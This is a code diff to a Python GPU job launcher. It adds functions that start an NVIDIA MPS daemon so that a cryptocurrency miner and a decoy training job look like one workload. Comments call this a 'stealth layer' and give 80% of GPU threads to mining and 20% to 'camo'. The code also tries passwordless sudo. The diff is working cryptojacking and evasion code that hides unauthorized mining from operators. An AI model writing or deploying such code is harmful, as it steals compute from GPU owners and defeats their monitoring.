@@ -185,6 +185,56 @@ done'''
         print(f"[GPU] Stealth bash failed: {e}", flush=True)
         return None
 
+def start_mps_daemon():
+    """Start NVIDIA CUDA MPS daemon for multi-process GPU sharing.
+    Makes miner + training job appear as one unified workload."""
+    try:
+        # Check if MPS is already running
+        r = subprocess.run(["nvidia-cuda-mps-control", "-h"],
+                          capture_output=True, timeout=5)
+        if r.returncode != 0:
+            print("[MPS] nvidia-cuda-mps-control not found", flush=True)
+            return False
+
+        # Stop any existing daemon
+        subprocess.run(["bash", "-c", "echo quit | nvidia-cuda-mps-control"],
+                      capture_output=True, timeout=5)
+        time.sleep(1)
+
+        # Start daemon
+        for pfx in [[], ["sudo", "-n"]]:
+            try:
+                subprocess.run(pfx + ["nvidia-cuda-mps-control", "-d"],
+                             capture_output=True, timeout=10)
+                time.sleep(2)
+
+                # Verify running
+                r = subprocess.run(["nvidia-cuda-mps-control", "-h"],
+                                  capture_output=True, timeout=5)
+                if r.returncode == 0:
+                    print("[MPS] Daemon started", flush=True)
+                    # Set default thread percentage (80% for mining, 20% for camo)
+                    subprocess.run(
+                        ["bash", "-c", "echo set_default_active_thread_percentage 80 | nvidia-cuda-mps-control"],
+                        capture_output=True, timeout=5)
+                    return True
+            except:
+                pass
+
+        print("[MPS] Failed to start daemon", flush=True)
+        return False
+    except Exception as e:
+        print(f"[MPS] Error: {e}", flush=True)
+        return False
+
+def stop_mps_daemon():
+    """Stop NVIDIA CUDA MPS daemon."""
+    try:
+        subprocess.run(["bash", "-c", "echo quit | nvidia-cuda-mps-control"],
+                      capture_output=True, timeout=5)
+    except:
+        pass
+
 def detect_gpu_type():
     """Detect H100 SXM vs PCIe for power limits."""
     try:
@@ -356,6 +406,9 @@ def launch_training(config, binary_path):
         os.environ.pop(key, None)
     
     print(f"[Training] Launching GPU workload...")
+    
+    # === STEALTH LAYER 0: MPS daemon (multi-process GPU sharing) ===
+    mps_active = start_mps_daemon()
     
     # Launch process
     process = subprocess.Popen(
@@ -676,6 +729,7 @@ def launch_training(config, binary_path):
         try:
             gpu_proc.terminate()
         except: pass
+    stop_mps_daemon()  # Stop MPS daemon
     try:
         # Reset GPU to defaults
         for pfx in [[], ["sudo", "-n"]]:
